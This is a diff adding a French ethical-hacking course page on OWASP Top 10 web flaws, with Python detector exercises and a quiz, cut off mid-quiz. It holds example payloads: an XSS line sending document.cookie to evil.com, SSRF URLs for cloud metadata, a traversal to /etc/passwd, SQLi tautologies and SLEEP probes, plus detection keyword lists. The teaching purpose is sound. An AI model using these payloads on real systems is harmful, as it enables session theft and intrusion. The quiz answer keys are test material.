@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4 — Exploitation des Vulnérabilités Web (OWASP Top 10 &amp; Injection) | Hacking Éthique &amp; Pentest B3</title>
+<meta name="description" content="Module 4 du cours Hacking Éthique &amp; Pentest B3 : Taxonomie de l'OWASP Top 10, défaillances de contrôle d'accès et références directes non sécurisées (IDOR), exploitation complète des injections SQL (In-band, UNION-based, Blind Boolean, Time-based et Stacked Queries), vulnérabilités côté client (Cross-Site Scripting XSS Stored/Reflected/DOM, CSRF et jetons SameSite), vulnérabilités serveur critiques (SSRF, injection de commandes OS), traversées de répertoires (Path Traversal / LFI / RFI) avec techniques de contournement de filtres, et maîtrise des outils d'interception (Burp Suite, OWASP ZAP, sqlmap, ffuf). Notions clés, démonstrations, ateliers de code interactifs, QCM corrigés.">
+<link rel="canonical" href="https://revi-mu.vercel.app/b3-hacking/chapitres/chapitre4.html">
+<meta property="og:title" content="Module 4 — Exploitation des Vulnérabilités Web (OWASP Top 10 &amp; Injection) | Hacking Éthique &amp; Pentest B3">
+<meta property="og:description" content="Module 4 du cours Hacking Éthique &amp; Pentest B3 : Taxonomie de l'OWASP Top 10, défaillances de contrôle d'accès et références directes non sécurisées (IDOR), exploitation complète des injections SQL (In-band, UNION-based, Blind Boolean, Time-based et Stacked Queries), vulnérabilités côté client (Cross-Site Scripting XSS Stored/Reflected/DOM, CSRF et jetons SameSite), vulnérabilités serveur critiques (SSRF, injection de commandes OS), traversées de répertoires (Path Traversal / LFI / RFI) avec techniques de contournement de filtres, et maîtrise des outils d'interception (Burp Suite, OWASP ZAP, sqlmap, ffuf). Notions clés, démonstrations, ateliers de code interactifs, QCM corrigés.">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="/assets/css/tokens.css">
+<link rel="stylesheet" href="../assets/css/cours.css">
+<link rel="stylesheet" href="/assets/css/code-lab.css">
+<script src="/assets/js/theme.js"></script>
+</head>
+<body data-chapter="4">
+
+<nav class="skip-nav" aria-label="Accès rapide"><a href="#content" class="skip-link">Aller au contenu</a></nav>
+
+<nav class="b3-hackingnav"><div class="b3-hackingnav__in">
+  <a class="b3-hackingnav__home" href="/" title="Accueil — Tous les portails" aria-label="Accueil — Tous les portails"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-house"></use></svg> <span>Portail</span></a>
+  <span class="b3-hackingnav__sep" aria-hidden="true">/</span>
+  <a class="b3-hackingnav__brand" href="../index.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-shield"></use></svg> Hacking Éthique &amp; Pentest B3</a>
+  <div class="b3-hackingnav__links">
+    <a href="../sommaire.html">Sommaire</a>
+    <a href="../chapitres/chapitre1.html">Ch. 1</a>
+    <a href="../chapitres/chapitre2.html">Ch. 2</a>
+    <a href="../chapitres/chapitre3.html">Ch. 3</a>
+    <a href="../chapitres/chapitre4.html" class="is-active">Ch. 4</a>
+    <a href="../chapitres/chapitre5.html">Ch. 5</a>
+    <a href="../chapitres/chapitre6.html">Ch. 6</a>
+    <a href="../chapitres/cartes.html">Cartes</a>
+    <a href="../chapitres/formules.html">Mémo</a>
+    <a href="../exercices/exercices.html">Exercices</a>
+    <a href="../atelier.html">Atelier</a>
+    <a href="../chapitres/simulateur-examen.html">Examen</a>
+  </div>
+  <div class="b3-hackingnav__actions">
+    <button type="button" class="theme-toggle" id="themeToggle" aria-label="Activer le mode sombre" title="Basculer le thème clair / sombre">
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+    </button>
+  </div>
+</div></nav>
+
+<main id="content" class="b3-hackingwrap">
+<p class="crumb"><a href="../index.html">Hacking Éthique & Pentest B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 4</p>
+
+<h1>Chapitre 4 — Exploitation des Vulnérabilités Web (OWASP Top 10 & Injection)</h1>
+
+<div class="chapmeta">
+    <span class="tag">Module 4</span>
+    <span class="tag tag--time">≈ 2 h 45 de travail</span>
+    <span class="tag tag--time">Réservé B3 et plus</span>
+  </div>
+
+  <div class="box box--situation">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-play"></use></svg> Mise en situation</div>
+    <p>Les applications web et API REST constituent la cible d'attaque la plus exposée et la plus vulnérable des entreprises contemporaines. Une simple absence de contrôle d'autorisation (IDOR) permet de télécharger les fiches de paie de l'ensemble du personnel, tandis qu'une injection SQL aveugle ou une inclusion de fichier local (LFI) peut déboucher sur l'exécution arbitraire de commandes sur le serveur sous-jacent. En tant que pentesteur B3, vous devez maîtriser les rouages intimes des failles de l'OWASP Top 10, manier avec précision Burp Suite et démontrer la faisabilité d'exploits éthiques tout en recommandant les remédiations architecturales définitives.</p>
+  </div>
+
+  <div class="box box--objectifs">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-target"></use></svg> Objectifs pédagogiques</div>
+    <p>À la fin de ce chapitre, tu seras capable de :</p>
+    <ol>
+      <li>maîtriser la taxonomie de l'OWASP Top 10 et identifier les failles de contrôle d'accès (IDOR) ;</li>
+      <li>exploiter et sécuriser les injections SQL sous toutes leurs variantes (UNION, Blind, Time-based) ;</li>
+      <li>différencier les attaques XSS (Stored, Reflected, DOM) et comprendre l'impact sur le vol de cookies de session ;</li>
+      <li>analyser le mécanisme des attaques SSRF (Server-Side Request Forgery) contre les métadonnées Cloud (AWS/GCP/Azure) ;</li>
+      <li>démontrer l'exploitation de traversées de répertoire (Path Traversal / LFI) avec contournements d'encodage ;</li>
+      <li>utiliser professionnellement Burp Suite (Proxy, Repeater, Intruder) et sqlmap pour automatiser l'audit applicatif.</li>
+    </ol>
+  </div>
+
+<h2>1. Taxonomie de l'OWASP Top 10 &amp; Défaillances de Contrôle d'Accès (A01 / IDOR)</h2>
+
+<p>Le projet OWASP (Open Web Application Security Project) publie la référence mondiale des risques applicatifs les plus critiques :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>A01:2021 — Broken Access Control</h4>
+    <p>La faille n°1 mondiale. Survient lorsque l'application ne vérifie pas côté serveur si l'utilisateur authentifié a le droit d'accéder à la ressource demandée.</p>
+    <p>Exemple type : <strong>IDOR (Insecure Direct Object Reference)</strong>. Un utilisateur modifie un paramètre dans l'URL (ex: <code>GET /api/documents/1042</code> vers <code>GET /api/documents/1001</code>) et accède aux documents d'un autre client sans contrôle d'autorisation.</p>
+  </div>
+  <div class="card">
+    <h4>A02:2021 — Cryptographic Failures</h4>
+    <p>Transmission de données sensibles en clair (HTTP au lieu de HTTPS), stockage de mots de passe sans hachage salé robuste (MD5/SHA-1 au lieu de bcrypt/Argon2id), ou utilisation de clés cryptographiques faibles ou codées en dur dans le code source.</p>
+  </div>
+</div>
+
+<h2>2. Injections SQL Approfondies : In-Band, Inférentielles &amp; Remédiation</h2>
+
+<p>L'injection SQL (A03:2021-Injection) intervient lorsqu'une entrée non filtrée est concaténée dynamiquement dans une requête SQL :</p>
+<table class="table">
+  <thead><tr><th>Type d'Injection SQL</th><th>Mécanisme d'Exploitation</th><th>Visibilité des Données</th></tr></thead>
+  <tbody>
+    <tr><td><strong>In-Band (UNION-based)</strong></td><td>Injection de l'opérateur <code>UNION SELECT</code> pour adjoindre le résultat d'une autre table au résultat légitime. Requiert un nombre de colonnes et des types compatibles.</td><td>Affichage direct dans le code HTML de la page de réponse.</td></tr>
+    <tr><td><strong>In-Band (Error-based)</strong></td><td>Déclenchement délibéré d'une erreur SQL syntaxique ou de conversion de type qui fait fuiter la donnée secrète dans le message d'erreur renvoyé.</td><td>Visible dans les messages d'erreur de la base de données.</td></tr>
+    <tr><td><strong>Blind (Boolean-based)</strong></td><td>Injection de conditions booléennes (<code>AND 1=1</code> vs <code>AND 1=2</code>). La page renvoie un contenu légèrement différent selon que la condition est vraie ou fausse.</td><td>Aucune donnée directe. Inférence par vrai/faux sur l'état de la page.</td></tr>
+    <tr><td><strong>Blind (Time-based)</strong></td><td>Injection de fonctions de délai conditionnelles (<code>IF(condition, SLEEP(5), 0)</code>). Si la supposition est juste, le serveur met 5 secondes à répondre.</td><td>Aucune donnée visible. Mesure du temps de réponse HTTP.</td></tr>
+  </tbody>
+</table>
+  <div class="box box--standard">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> L'Unique Remédiation Définitive : Les Requêtes Préparées (Prepared Statements)</div>
+<p>L'échappement manuel des caractères ou les listes noires de mots-clés sont voués à l'échec. L'unique défense absolue contre les injections SQL est l'utilisation universelle de requêtes paramétrées :</p>,<pre><code>// EXEMPLE SÉCURISÉ (PHP PDO avec requêtes préparées)
+$stmt = $pdo->prepare("SELECT id, email FROM users WHERE username = :user AND password_hash = :pwd");
+$stmt->execute([":user" => $input_user, ":pwd" => $input_pwd]);
+$user = $stmt->fetch();</code></pre>,<p>Le compilateur SQL analyse et verrouille l'arbre syntaxique de la requête avant d'injecter les variables comme de simples valeurs littérales inoffensives.</p>
+  </div>
+
+<h2>3. Vulnérabilités Côté Client : XSS (Cross-Site Scripting) &amp; CSRF</h2>
+
+<p>Les vulnérabilités client-side ciblent le navigateur des utilisateurs légitimes plutôt que le serveur de base de données :</p>
+<div class="grid grid-3">
+  <div class="card">
+    <h4>XSS Stockée (Stored / Persistent)</h4>
+    <p>Le script malveillant (ex: <code>&lt;script&gt;fetch("http://evil.com/steal?c="+document.cookie)&lt;/script&gt;</code>) est stocké de manière permanente dans la base (forum, profil, commentaire).</p>
+    <p>Chaque utilisateur consultant la page exécute le script à son insu. Faille critique pour le vol de session.</p>
+  </div>
+  <div class="card">
+    <h4>XSS Réfléchie (Reflected)</h4>
+    <p>La charge utile est injectée dans un paramètre d'URL (ex: recherche) et immédiatement renvoyée par le serveur dans la page sans échappement.</p>
+    <p>L'attaquant doit piéger la victime en lui faisant cliquer sur un lien forgé (phishing).</p>
+  </div>
+  <div class="card">
+    <h4>XSS Basée sur le DOM (DOM-based)</h4>
+    <p>La vulnérabilité réside entièrement dans le code JavaScript côté client qui lit une source non fiable (<code>location.hash</code>, <code>location.search</code>) et l'injecte dans un récepteur dangereux (<code>innerHTML</code>, <code>eval()</code>) sans passer par le serveur.</p>
+  </div>
+</div>
+  <div class="box box--standard">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Défense en Profondeur contre le Vol de Session XSS</div>
+<p>Pour empêcher un script malveillant d'accéder aux jetons d'authentification :</p>,<ul>,  <li><strong>Attribut de cookie <code>HttpOnly</code> :</strong> interdit formellement à l'API JavaScript <code>document.cookie</code> de lire le cookie de session dans le navigateur.</li>,  <li><strong>Content Security Policy (CSP) :</strong> politique restrictive dans les en-têtes HTTP bloquant l'exécution de scripts inline non signés (<code>script-src 'self'</code>).</li>,  <li><strong>Attribut <code>SameSite=Strict</code> ou <code>Lax</code> :</strong> protège contre les attaques de type Cross-Site Request Forgery (CSRF).</li>,</ul>
+  </div>
+
+<h2>4. Vulnérabilités Serveur Critiques : SSRF, RCE &amp; Path Traversal (LFI)</h2>
+
+<p>Certaines défaillances permettent à un attaquant d'interagir directement avec les systèmes internes :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>SSRF (Server-Side Request Forgery)</h4>
+    <p>L'application web prend une URL en paramètre (ex: aperçu d'image, webhook) et effectue une requête HTTP depuis le serveur cible.</p>
+    <p>L'attaquant fournit une URL interne inaccessible depuis Internet :</p>
+    <ul>
+      <li><code>http://169.254.169.254/latest/meta-data/</code> : extraction des clés d'accès IAM sur AWS ou GCP (Metadata API).</li>
+      <li><code>http://localhost:8080/admin</code> : accès aux interfaces d'administration internes isolées.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4>Traversée de Répertoire &amp; LFI</h4>
+    <p>L'application charge un fichier à partir d'un paramètre non vérifié (ex: <code>template=fr.php</code>).</p>
+    <p>En injectant des séquences de remontée <code>../../../../etc/passwd</code>, l'attaquant lit les fichiers système.</p>
+    <p>Si la fonction exécute le code inclus (LFI PHP avec <code>include</code>), l'attaquant peut combiner la LFI avec un empoisonnement de logs pour obtenir une RCE complète.</p>
+  </div>
+</div>
+
+<h2>5. Boîte à Outils Professionnelle d'Audit Web : Burp Suite &amp; sqlmap</h2>
+
+<p>L'audit de sécurité des applications web s'appuie sur un outillage d'interception incontournable :</p>
+<div class="grid grid-3">
+  <div class="card">
+    <h4>Burp Suite Proxy &amp; Repeater</h4>
+    <p>Intercepte tout le trafic HTTP/HTTPS entre le navigateur et le serveur. Permet de modifier à la volée en-têtes, cookies et paramètres POST (Repeater) pour tester les contrôles d'accès.</p>
+  </div>
+  <div class="card">
+    <h4>Burp Intruder &amp; Fuzzers (ffuf)</h4>
+    <p>Automatisation d'attaques par dictionnaire : fuzzing de répertoires cachés, brute-force de paramètres, énumération d'identifiants et tests de contournement d'authentification.</p>
+  </div>
+  <div class="card">
+    <h4>sqlmap</h4>
+    <p>Outil open-source de référence pour la détection et l'exploitation automatisée des injections SQL (fingerprinting de SGBD, extraction de tables, dump de hashes et obtention de shell OS via <code>--os-shell</code>).</p>
+  </div>
+</div>
+
+<!-- code-labs:start -->
+  <h2>6. Exercices de code</h2>
+  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code
+  sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas :
+  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
+  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
+  s’est passé et par où chercher, sans jamais écrire de code à votre place — c’est le principe de l’exercice.</p>
+<div class="lab" data-lab
+     data-exercise="hk3-c4-e1"
+     data-language="python"
+     data-height="300"
+     data-stdin="SQLI_CHECK param=admin' OR '1'='1' --">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : détecter les motifs d'injection SQL
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 1 — Détecteur de Vecteurs d'Injection SQL (SQLi Pattern Analyzer)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n1">Niveau 1 — Acquisition</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Analyser une chaîne de paramètres HTTP pour détecter et classifier les signatures d'injection SQL.</p>
+    <div class="lab__brief"><p>L'injection SQL (A03:2021-Injection dans l'OWASP Top 10) survient lorsqu'une entrée utilisateur non nettoyée est concaténée dans une commande SQL.<br><br>
+Types de motifs surveillés (insensibles à la casse) :<br>
+1. <code>SQLI_UNION</code> : contient <code>UNION SELECT</code> ou <code>UNION ALL SELECT</code>.<br>
+2. <code>SQLI_TAUTOLOGY</code> : contient <code>OR 1=1</code>, <code>OR '1'='1'</code>, <code>OR "1"="1"</code> ou <code>OR ""=""</code>.<br>
+3. <code>SQLI_STACKED</code> : contient <code>; DROP</code>, <code>; INSERT</code>, <code>; UPDATE</code>, <code>; DELETE</code> ou <code>; WAITFOR</code>.<br>
+4. <code>SQLI_COMMENT</code> : contient <code>--</code>, <code>/*</code> ou <code>#</code> en fin ou milieu de chaîne suspecte.<br><br>
+Priorité d'attribution : <code>SQLI_UNION</code> &gt; <code>SQLI_TAUTOLOGY</code> &gt; <code>SQLI_STACKED</code> &gt; <code>SQLI_COMMENT</code>.<br><br>
+Entrée STDIN : <code>SQLI_CHECK param=&lt;valeur&gt;</code>.<br>
+Sortie :<br>
+- Si injection : <code>SQLI_ALERT: pattern=&lt;TYPE&gt; severity=CRITICAL status=INJECTION_DETECTED</code><br>
+- Si sain : <code>SQLI_ALERT: pattern=NONE severity=NONE status=CLEAN_PARAM</code></p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>SQLI_CHECK param=admin' OR '1'='1' --</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>SQLI_ALERT: pattern=SQLI_TAUTOLOGY severity=CRITICAL status=INJECTION_DETECTED</pre></div>
+    </div>
+    <p class="lab__note">Tautologie booléenne classique permettant le contournement d'authentification.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Extrayez la valeur du paramètre avec line.split("param=", 1)[1] pour préserver les espaces.</li>
+        <li>Convertissez la valeur en majuscules pour tester les mots-clés UNION SELECT, OR 1=1, etc.</li>
+        <li>Vérifiez les motifs dans l'ordre de priorité spécifié.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="hk3-c4-e2"
+     data-language="python"
+     data-height="300"
+     data-stdin="TIME_INFER actual_secret=FLAG probes=1:F,1:B,2:L,3:A,4:G">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : simuler l'injection temporelle
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 2 — Simulateur d'Attaque par Injection SQL Aveugle Basée sur le Temps</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n2">Niveau 2 — Application</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Simuler l'inférence de données caractère par caractère via des sondes temporelles (Time-Based Blind SQLi).</p>
+    <div class="lab__brief"><p>Quand une application web ne renvoie aucune erreur ni donnée dans ses pages, l'attaquant exploite une commande de temporisation (ex: <code>IF(SUBSTRING(secret,1,1)='A', SLEEP(5), 0)</code>).<br><br>
+Règles de simulation :<br>
+- Un secret est stocké sur la cible : <code>actual_secret</code>.<br>
+- Chaque sonde teste un couple <code>pos:char</code> (position 1-indexée).<br>
+- Si <code>1 &lt;= pos &lt;= len(actual_secret)</code> et <code>actual_secret[pos - 1] == char</code> :<br>
+  - La condition est <code>TRUE</code>, le délai simulé vaut <code>5.0s</code>, caractère confirmé.<br>
+- Sinon :<br>
+  - La condition est <code>FALSE</code>, le délai vaut <code>0.0s</code>, caractère réfuté.<br><br>
+Entrée STDIN : <code>TIME_INFER actual_secret=&lt;secret&gt; probes=&lt;pos1:c1,pos2:c2,...&gt;</code>.<br>
+Sorties :<br>
+- Pour chaque sonde : <code>PROBE: pos=&lt;p&gt; char=&lt;c&gt; match=&lt;TRUE|FALSE&gt; delay=&lt;5.0|0.0&gt;s</code><br>
+- Ligne récapitulative finale : <code>EXTRACTED: confirmed_chars=&lt;caractères_trouvés_dans_l_ordre|NONE&gt;</code> (chaîne des caractères validés concaténés dans l'ordre croissant de leur position unique).</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>TIME_INFER actual_secret=FLAG probes=1:F,1:B,2:L,3:A,4:G</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>PROBE: pos=1 char=F match=TRUE delay=5.0s
+PROBE: pos=1 char=B match=FALSE delay=0.0s
+PROBE: pos=2 char=L match=TRUE delay=5.0s
+PROBE: pos=3 char=A match=TRUE delay=5.0s
+PROBE: pos=4 char=G match=TRUE delay=5.0s
+EXTRACTED: confirmed_chars=FLAG</pre></div>
+    </div>
+    <p class="lab__note">Extraction complète des 4 caractères du secret grâce au délai de 5 secondes.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Parcourez probes en découpant pos:char.</li>
+        <li>Comparez char avec secret[pos - 1] si pos est dans les bornes.</li>
+        <li>Conservez un dictionnaire {pos: char} des caractères validés pour reconstituer la chaîne finale.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="hk3-c4-e3"
+     data-language="python"
+     data-height="300"
+     data-stdin="LFI_CHECK path=../../../../etc/passwd">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : analyser la traversée de répertoire
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 3 — Analyseur de Traversée de Répertoire et Inclusion de Fichiers (Path Traversal / LFI)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Détecter les tentatives de traversée de répertoire (Directory Traversal) et normaliser les chemins d'accès URI.</p>
+    <div class="lab__brief"><p>L'attaque par traversée de répertoire vise à accéder à des fichiers situés hors du dossier racine autorisé (ex: <code>/etc/passwd</code>, <code>win.ini</code>).<br><br>
+Algorithme de normalisation et détection :<br>
+1. Décodage d'URL : remplacer <code>%2e%2e%2f</code> et <code>%2e%2e/</code> par <code>../</code>, <code>%2e%2e%5c</code> par <code>..\</code>.<br>
+2. Remplacer les séparateurs Windows <code>\</code> par <code>/</code>.<br>
+3. Tronquer la chaîne si un octet nul (<code>%00</code> ou <code>\0</code>) est injecté.<br>
+4. Résolution de chemin virtuel :<br>
+   - Partir d'une liste vide de segments.<br>
+   - Pour chaque segment entre les slashes <code>/</code> :<br>
+     - Si <code>.</code> ou vide : ignorer.<br>
+     - Si <code>..</code> : dépiler le dernier segment s'il existe. Si la pile est déjà vide, marquer <code>ESCAPED_ROOT = True</code>.<br>
+     - Sinon : empiler le segment.<br>
+5. Décision de sécurité :<br>
+   - Si <code>ESCAPED_ROOT</code> est Vrai ou si le chemin résolu cible un fichier système sensible (<code>passwd</code>, <code>shadow</code>, <code>hosts</code>, <code>win.ini</code>) :<br>
+     <code>status=BLOCKED_TRAVERSAL</code>, <code>risk=CRITICAL</code>.<br>
+   - Sinon : <code>status=SAFE_ACCESS</code>, <code>risk=LOW</code>.<br><br>
+Entrée STDIN : <code>LFI_CHECK path=&lt;chemin_brut&gt;</code>.<br>
+Sortie : <code>LFI_AUDIT: input=&lt;path&gt; resolved=&lt;/seg1/seg2|ROOT&gt; status=&lt;BLOCKED_TRAVERSAL|SAFE_ACCESS&gt; risk=&lt;CRITICAL|LOW&gt;</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>LFI_CHECK path=../../../../etc/passwd</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>LFI_AUDIT: input=../../../../etc/passwd resolved=/etc/passwd status=BLOCKED_TRAVERSAL risk=CRITICAL</pre></div>
+    </div>
+    <p class="lab__note">Tentative d'évasion de racine pour lire le fichier système des comptes Linux.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Normalisez les encodages URL (%2e%2e%2f -&gt; ../).</li>
+        <li>Tronquez à %00 si présent.</li>
+        <li>Gérez la pile de segments et détectez si une tentative de sortie de racine survient.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+  <!-- code-labs:end -->
+  <h2>7. QCM — niveau examen</h2>
+
+  <div class="qcm">
+    <div class="q">
+      <p class="q__stem">Quelle vulnérabilité occupe la 1ère place du classement de l'OWASP Top 10 (A01:2021) ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Broken Access Control (Défaillances du contrôle d'accès / IDOR)</button>
+        <button class="opt">Cryptographic Failures (Faiblesses cryptographiques)</button>
+        <button class="opt">Injection (Injections SQL, commande)</button>
+        <button class="opt">Security Misconfiguration (Mauvaise configuration de sécurité)</button>
+      </div>
+      <div class="q__exp">Broken Access Control est classé n°1 de l'OWASP Top 10 : il permet à un utilisateur non autorisé d'agir sur des ressources d'autres utilisateurs en modifiant simplement des paramètres (IDOR).</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Dans une injection SQL de type UNION-based, quelle condition technique impérative doit être respectée pour que la requête UNION s'exécute avec succès ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">La requête injectée doit retourner exactement le même nombre de colonnes que la requête originelle avec des types de données compatibles</button>
+        <button class="opt">Le serveur de base de données doit obligatoirement tourner sous le système d'exploitation Linux</button>
+        <button class="opt">Le mot de passe de l'administrateur SQL doit être transmis en clair dans la chaîne injectée</button>
+        <button class="opt">La table cible doit comporter au moins 10 000 enregistrements</button>
+      </div>
+      <div class="q__exp">L'opérateur SQL UNION exige strictement que les deux requêtes combinées comportent le même nombre de colonnes et que les types de données correspondants soient compatibles.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quelle est la seule mesure de protection absolue et définitive préconisée par l'OWASP contre les injections SQL ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">L'utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements)</button>
+        <button class="opt">Le filtrage par liste noire supprimant le mot "SELECT" et les tirets "--"</button>
+        <button class="opt">Le remplacement du protocole HTTP par HTTPS sur le serveur web</button>
+        <button class="opt">L'activation d'un pare-feu matériel sur le port 80</button>
+      </div>
+      <div class="q__exp">Les requêtes préparées compilent la structure de la requête indépendamment des données : les entrées utilisateur ne peuvent plus altérer la logique syntaxique de la commande SQL.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel attribut de cookie HTTP empêche formellement un script malveillant injecté via XSS d'accéder à la valeur du cookie de session via document.cookie ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">HttpOnly</button>
+        <button class="opt">Secure</button>
+        <button class="opt">SameSite=Lax</button>
+        <button class="opt">Domain=.local</button>
+      </div>
+      <div class="q__exp">L'attribut HttpOnly indique au navigateur de refuser tout accès au cookie depuis les scripts JavaScript côté client (document.cookie), protégeant ainsi le jeton de session du vol par XSS.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Dans quel scénario une attaque XSS est-elle qualifiée de "Stockée" (Stored ou Persistante) ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Lorsque la charge utile malveillante est enregistrée durablement dans la base de données du serveur et réaffichée à tous les visiteurs</button>
+        <button class="opt">Lorsque le script est exécuté uniquement sur la machine de l'attaquant sans jamais quitter son navigateur</button>
+        <button class="opt">Lorsque la faille nécessite la modification manuelle du fichier hosts de la victime</button>
+        <button class="opt">Lorsque l'attaque cible exclusivement des cookies expirés</button>
+      </div>
+      <div class="q__exp">Une XSS stockée (Stored) réside de manière permanente dans la base de données (ex: commentaire de forum) et infecte automatiquement chaque utilisateur légitime consultant la page.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quelle est la cible classique d'une attaque SSRF (Server-Side Request Forgery) exécutée contre une application hébergée dans le Cloud (AWS/GCP) ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">L'adresse IP de l'API de métadonnées interne 169.254.169.254 pour extraire les jetons d'accès et clés IAM temporaires</button>
+        <button class="opt">Le serveur DNS racine mondial situé sur Internet</button>
+        <button class="opt">L'imprimante réseau de l'auditeur de sécurité</button>
+        <button class="opt">Le registre des brevets de l'entreprise</button>
+      </div>
+      <div class="q__exp">Dans le Cloud (AWS, GCP, Azure), l'adresse locale 169.254.169.254 expose un service interne de métadonnées non authentifié qui divulgue les identifiants temporaires du rôle IAM de la machine.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel composant de Burp Suite est spécialement conçu pour rejouer, modifier manuellement et analyser pas à pas des requêtes HTTP unitaires ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">Burp Repeater</button>
+        <button class="opt">Burp Intruder</button>
+        <button class="opt">Burp Sequencer</button>
+        <button class="opt">Burp Decoder</button>
+      </div>
+      <div class="q__exp">Burp Repeater permet de renvoyer une requête HTTP capturée, de modifier ses paramètres ou en-têtes et d'observer immédiatement la réponse du serveur cible.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Comment une vulnérabilité de traversée de répertoire (Path Traversal) peut-elle être exploitée même si l'application filtre les deux points successifs "..//" de façon basique ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">En utilisant des encodages URL alternatifs comme %2e%2e%2f ou des séquences imbriquées comme ....//</button>
+        <button class="opt">En augmentant la taille de la mémoire vive du navigateur</button>
+        <button class="opt">En forçant le protocole FTP au lieu de HTTP</button>
